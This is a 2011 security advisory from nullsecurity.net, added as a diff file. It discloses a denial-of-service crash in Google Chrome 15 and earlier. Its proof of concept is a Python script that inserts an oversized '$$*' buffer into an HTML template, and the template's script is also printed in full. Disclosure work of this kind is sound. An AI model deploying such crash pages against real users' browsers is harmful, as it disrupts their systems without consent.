@@ -1,0 +1,120 @@
+===============================================================================
+|                                                                             |
+                         ____                     _ __
+              ___  __ __/ / /__ ___ ______ ______(_) /___ __
+             / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /
+            /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /
+                                                     /___/ team
+
+                          PUBLIC SECURITY ADVISORY
+|                                                                             |
+===============================================================================
+
+
+TITLE
+=====
+
+Google Chrome PoC, killing process. (DoS)
+
+
+AUTHOR
+======
+
+pigtail23
+
+
+DATE
+====
+
+10-22-2011
+
+
+VENDOR
+======
+
+Chrome - http://www.google.com/chrome
+
+
+AFFECTED PRODUCT
+================
+
+Google Chrome <= 15.0.874.106
+
+
+AFFECTED PLATFORMS
+==================
+
+Windows XP, Vista, 7
+
+
+VULNERABILITY CLASS
+===================
+
+Denial of Service
+
+
+DESCRIPTION
+===========
+
+It seems this is a stack overflow. No way to exploit it.
+
+
+PROOF OF CONCEPT
+================
+
+Python script for debugging:
+
+--- SNIP ---
+
+#!/usr/bin/python
+
+filename = 'poc.html'
+content = open('template.html', 'r').read()
+
+buff = '$$*' * 36800 
+
+rc = 484
+content2 = content[:rc] + buff + content[rc:]	
+
+FILE = open(filename,"w")
+FILE.write(content2)
+FILE.close()
+
+
+template.html:
+
+<html>
+<body>
+<script>(function(){var d=document;if(!("autofocus" in d.createElement("input"))){try{d.getElementById("yschsp").focus();}catch(e){}}data={"assist":{"url":"http:\/\/www.google.com","maxLength":38,"linkStem":"http:\/\/www.remoteshell.de","settingsUrl":"http:\/\/www.chrooome.xxx","strings":{"searchbox_title":"bam","settings_text":"bam","gossip_desc":"bam","scroll_up":"bam","scroll_down":"bam","aria_available_suggestions":"bam","aria_no_suggestion_available":"bam"}}};window.onload=function(){var h=d.getElementsByTagName("head")[0],o=d.createElement("script");o.src="http://www.0__o";h.appendChild(o);};}());</script>
+</body>
+</html>
+
+--- SNIP ---
+
+
+IMPACT
+======
+
+You can only provoke a crash of a Google Chrome process.
+
+
+THREAT LEVEL
+============
+
+LOW
+
+
+STATUS
+======
+
+Not fixed.
+
+
+DISCLAIMER
+==========
+
+nullsecurity.net hereby emphasize, that the information which is published here are
+for education purposes only. nullsecurity.net does not take any responsibility for
+any abuse or misusage!
+
+                Copyright (c) 2011 - nullsecurity.net
